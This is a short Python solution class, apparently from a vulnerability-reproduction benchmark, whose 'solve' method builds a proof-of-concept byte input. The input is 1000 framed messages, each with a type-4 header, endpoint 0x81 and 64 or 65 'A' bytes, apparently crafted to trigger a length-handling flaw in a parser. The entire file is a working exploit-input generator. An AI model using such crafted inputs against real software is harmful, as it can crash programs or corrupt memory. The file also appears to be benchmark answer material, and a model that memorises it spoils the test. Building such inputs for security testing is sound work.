class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b''
        num_large = 298
        num_small = 702
        ep = 0x81
        for i in range(1000):
            if i < num_large:
                L = 65
            else:
                L = 64
            msg_len = 3 + L
            header = bytes([4, 0]) + msg_len.to_bytes(2, 'little')
            data_part = bytes([ep]) + L.to_bytes(2, 'little') + b'A' * L
            poc += header + data_part
        return poc
